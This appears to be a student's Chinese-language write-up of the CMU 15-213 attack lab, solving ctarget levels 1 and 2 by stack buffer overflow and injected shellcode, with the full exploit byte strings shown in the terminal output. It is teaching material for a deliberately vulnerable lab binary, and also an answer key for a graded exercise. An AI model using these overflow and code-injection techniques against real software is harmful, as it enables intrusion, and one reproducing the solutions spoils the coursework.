## attack lab

### ctarget 1

通过gdb可以观察到buffer的容量是多少，通过栈溢出，把最后的跳转地址覆盖成任务1的地址就可以，中间的数(栈内的)可以是任意的，不影响

```
fanzhipeng@LAPTOP-ILT6KOAH:~/work/cmu15213/attacklab$ ./ctarget -q < ctarget1raw
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00

```

### ctarget 2

我们还是想将返回值设置成target2 的地址，但是我们还需要额外的执行rdi = 2

所以我们需要将栈顶的返回地址覆盖成 执行rdi=2的地址，而执行rdi=2的地址可以是栈内(buffer容量内)的任意一处, 另外需要注意小端序的问题，

movq $cookie, %rdi 可以用gcc -c 生成汇编文件，然后objdump得到二进制格式。

```
fanzhipeng@LAPTOP-ILT6KOAH:~/work/cmu15213/attacklab$ ./ctarget -q < ctarget2raw
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 C3 90 90 90 90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 EC 17 40 00

```



